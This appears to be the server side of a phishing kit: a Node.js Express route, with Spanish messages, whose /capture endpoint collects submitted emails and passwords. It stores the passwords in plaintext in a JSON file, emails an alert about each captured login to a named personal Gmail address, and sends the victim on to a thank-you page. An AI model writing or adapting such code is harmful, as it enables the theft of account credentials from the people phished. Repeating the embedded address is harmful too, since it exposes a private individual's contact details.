const express = require('express');
const router = express.Router();
const mailer = require('../utils/mailer');
const storage = require('../utils/storage');

router.post('/capture', (req, res) => {
    const { email, password } = req.body;
    const data = { email, password, timestamp: new Date().toISOString() };

    storage.appendData('responses.json', data, err => {
        if (err) {
            console.error('Error guardando los datos:', err);
            return res.status(500).send('Error interno del servidor');
        }
        
        mailer.sendMail({
            to: 'cchacon266@gmail.com',
            subject: 'Se ha iniciado sesión',
            text: `Se ha iniciado sesión con el correo electrónico: ${email}`
        }).then(() => {
            console.log('Correo enviado correctamente.');
        }).catch((error) => {
            console.error('Error al enviar el correo:', error);
        }).finally(() => {
            res.redirect('/thank_you.html');
        });
    });
});

module.exports = router;
